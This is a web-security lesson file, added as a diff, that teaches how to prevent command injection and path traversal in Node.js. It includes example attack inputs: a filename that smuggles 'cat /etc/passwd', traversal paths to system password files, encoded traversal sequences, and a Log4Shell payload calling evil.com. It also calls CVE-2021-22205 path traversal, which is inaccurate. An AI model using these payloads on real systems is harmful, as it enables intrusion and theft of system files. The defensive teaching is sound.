@@ -1,0 +1,85 @@
+{
+  "id": "06-command-injection",
+  "version": "1.0.0",
+  "technology": "websecurity",
+  "module": "injection-attacks",
+  "title": "Command & Path Injection",
+  "subtitle": "OS command injection, path traversal, and the principle of never passing user input to the shell",
+  "difficulty": "intermediate",
+  "estimatedMinutes": 12,
+  "status": "published",
+  "prerequisites": ["websecurity/05-xss"],
+  "skillsTaught": ["websecurity.command-injection", "websecurity.path-traversal", "websecurity.shell-escape", "websecurity.file-access"],
+  "content": [
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "OS command injection"
+    },
+    {
+      "type": "paragraph",
+      "text": "Command injection happens when user input is passed to a shell command. The attacker injects shell operators (; | && ||) to run additional commands. Unlike SQL injection (which is limited to the database), command injection gives attackers access to the entire operating system: read any file, create users, download malware, pivot to internal services. It's catastrophic."
+    },
+    {
+      "type": "code",
+      "lang": "typescript",
+      "filename": "Command injection — vulnerable vs safe",
+      "code": "import { exec, execFile } from 'child_process';\n\n// VULNERABLE — user input passed to shell\napp.post('/convert', (req, res) => {\n  const filename = req.body.filename;  // e.g., 'report.pdf'\n\n  // Attack: filename = 'report.pdf; cat /etc/passwd; echo '\n  // Shell executes: convert report.pdf; cat /etc/passwd; echo  output.png\n  // /etc/passwd is now returned to the attacker\n  exec(`convert ${filename} output.png`, (err, stdout) => {\n    res.send(stdout);\n  });\n});\n\n// SAFE APPROACH 1 — execFile (bypasses shell entirely)\napp.post('/convert', (req, res) => {\n  const filename = req.body.filename;\n\n  // Validate input first — only allow safe filenames\n  if (!/^[\\w\\-]+\\.pdf$/.test(filename)) {\n    return res.status(400).json({ error: 'Invalid filename' });\n  }\n\n  // execFile passes arguments as an array — no shell interpretation\n  // ';' in the filename becomes a literal argument, not a shell separator\n  execFile('convert', [filename, 'output.png'], (err, stdout) => {\n    if (err) return res.status(500).json({ error: 'Conversion failed' });\n    res.send(stdout);\n  });\n});\n\n// SAFE APPROACH 2 — avoid shell commands entirely\n// Use native Node.js libraries instead of shelling out:\n// Instead of: exec('ffmpeg -i video.mp4 ...')\n// Use: fluent-ffmpeg library\n// Instead of: exec('convert image.png ...')\n// Use: sharp library\n// Instead of: exec('zip archive.zip files/')\n// Use: archiver library\n// Rule: if there's a native library, use it — no shell needed"
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "Path traversal"
+    },
+    {
+      "type": "code",
+      "lang": "typescript",
+      "filename": "Path traversal — reading files outside intended directory",
+      "code": "import path from 'path';\nimport fs from 'fs';\n\n// VULNERABLE — user controls file path\napp.get('/files/:filename', (req, res) => {\n  const filename = req.params.filename;\n\n  // Attack: filename = '../../etc/passwd'\n  // Reads: /app/uploads/../../etc/passwd  →  /etc/passwd\n  // Returns the system password file!\n  const filePath = `/app/uploads/${filename}`;\n  res.sendFile(filePath);\n});\n\n// SAFE — resolve and validate the path stays within allowed directory\nconst UPLOAD_DIR = path.resolve('/app/uploads');\n\napp.get('/files/:filename', (req, res) => {\n  const filename = req.params.filename;\n\n  // path.resolve() handles ../ and symlinks\n  const requestedPath = path.resolve(UPLOAD_DIR, filename);\n\n  // CRITICAL CHECK: does the resolved path start with the allowed directory?\n  if (!requestedPath.startsWith(UPLOAD_DIR + path.sep)) {\n    // '../' attack detected — reject\n    return res.status(403).json({ error: 'Access denied' });\n  }\n\n  // Safe to serve\n  res.sendFile(requestedPath);\n});\n\n// ADDITIONAL: validate filename characters\nfunction isSafeFilename(name: string): boolean {\n  // Only allow alphanumeric, dash, underscore, dot\n  // Block: ../, /, \\, null bytes, %00\n  return /^[\\w\\-\\.]+$/.test(name) && !name.includes('..');\n}"
+    },
+    {
+      "type": "code",
+      "lang": "text",
+      "filename": "Common injection vectors to sanitise",
+      "code": "SHELL METACHARACTERS to watch for in shell-adjacent contexts:\n  ;   (command separator)\n  |   (pipe to another command)\n  &&  (run second if first succeeds)\n  ||  (run second if first fails)\n  $() (command substitution)\n  ``  (backtick command substitution)\n  >   (redirect output to file)\n  <   (read from file)\n  &   (run in background)\n  *   (glob expansion)\n  ?   (glob expansion)\n  !   (history expansion in bash)\n\nPATH TRAVERSAL sequences:\n  ../       (parent directory, Unix)\n  ..\\\\      (parent directory, Windows)\n  %2e%2e%2f (URL-encoded ../)\n  %252e%252e (double-encoded ../)\n  ..%c0%af   (overlong UTF-8 encoding of /)\n\nNULL BYTE INJECTION:\n  filename%00.jpg → may be interpreted as 'filename' by some languages\n  Terminates string in C-based functions while passing extension check"
+    },
+    {
+      "type": "warning",
+      "text": "<strong>Never use <code>exec()</code> with user input.</strong> Always use <code>execFile()</code> (which takes an array of arguments, bypassing the shell) or, better, a native library that doesn't invoke the OS shell at all. The same rule applies to Python's <code>subprocess.call(shell=True)</code>, PHP's <code>exec()</code>, and Ruby's backtick operator. If you must call a shell command with user-derived data, use a proper shell-escaping library (<code>shell-quote</code> in npm) — but prefer eliminating the shell call entirely."
+    },
+    {
+      "type": "quiz",
+      "questions": [
+        {
+          "id": "websecurity-06-q1",
+          "question": "A file download endpoint builds the path as: path.join('/app/uploads', userFilename). A user requests filename '../../etc/shadow'. What is the resolved path, and is this safe?",
+          "type": "multiple-choice",
+          "options": [
+            "Resolves to /app/uploads/../../etc/shadow = /etc/shadow. Unsafe — path traversal bypasses the uploads directory",
+            "Resolves to /app/uploads/etc/shadow. Safe — path.join blocks traversal",
+            "path.join throws an error on .. sequences",
+            "Resolves to /etc/shadow. Safe because the OS checks permissions"
+          ],
+          "correctAnswer": 0,
+          "explanation": "path.join normalises the path but does NOT prevent traversal: path.join('/app/uploads', '../../etc/shadow') returns '/etc/shadow'. The fix is to use path.resolve() and then check that the result still starts with the allowed directory: if (!resolved.startsWith(UPLOAD_DIR + path.sep)) { reject() }. OS file permissions provide some protection (if the Node process runs as a restricted user), but you should not rely on OS permissions as your primary application-level security control — defence in depth means checking at both levels."
+        }
+      ]
+    }
+  ],
+  "faq": [
+    {
+      "q": "Is command injection really common in Node.js apps?",
+      "a": "Less common than SQL injection or XSS, but it appears in image conversion, PDF generation, file processing, and any feature that shells out to a system tool. It's especially dangerous in developer tools, admin panels, and CI/CD systems where the attacker may already have some level of access. Severity is typically critical — code execution on the server is the worst outcome in web security."
+    }
+  ],
+  "sources": [
+    { "name": "OWASP OS Command Injection Prevention Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html", "verified": "2026-11-04" }
+  ],
+  "realWorld": {
+    "usedIn": ["image conversion features", "file processing", "admin tools", "CI/CD systems"],
+    "examples": [
+      "The 2021 GitLab CE/EE critical vulnerability (CVE-2021-22205) was a remote code execution via path traversal in file upload handling. An unauthenticated attacker could upload a crafted image that triggered ExifTool processing, leading to OS command execution. CVSS score 10.0. Over 50,000 GitLab instances were exposed",
+      "Log4Shell (2021, CVE-2021-44228) was a JNDI injection vulnerability in Java's Log4j library — a form of injection where log messages containing ${jndi:ldap://evil.com/a} triggered a remote class load and code execution. CVSS 10.0. Hundreds of millions of systems were affected. The lesson: injection vulnerabilities appear in unexpected places — even logging libraries"
+    ]
+  }
+}
